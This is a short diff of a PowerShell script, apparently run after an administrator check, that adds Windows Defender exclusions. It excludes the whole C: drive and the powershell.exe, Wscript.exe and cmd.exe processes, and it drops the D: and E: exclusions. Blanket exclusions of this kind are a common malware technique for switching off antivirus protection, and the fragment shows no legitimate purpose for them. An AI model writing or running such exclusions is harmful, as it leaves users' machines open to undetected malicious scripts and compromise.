@@ -6,8 +6,7 @@ if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S
 
 
 Add-MpPreference -ExclusionPath  C:\
-Add-MpPreference -ExclusionPath  d:\
-Add-MpPreference -ExclusionPath  e:\
+
 Add-MpPreference -ExclusionProcess powershell.exe
 Add-MpPreference -ExclusionProcess Wscript.exe
 Add-MpPreference -ExclusionProcess cmd.exe
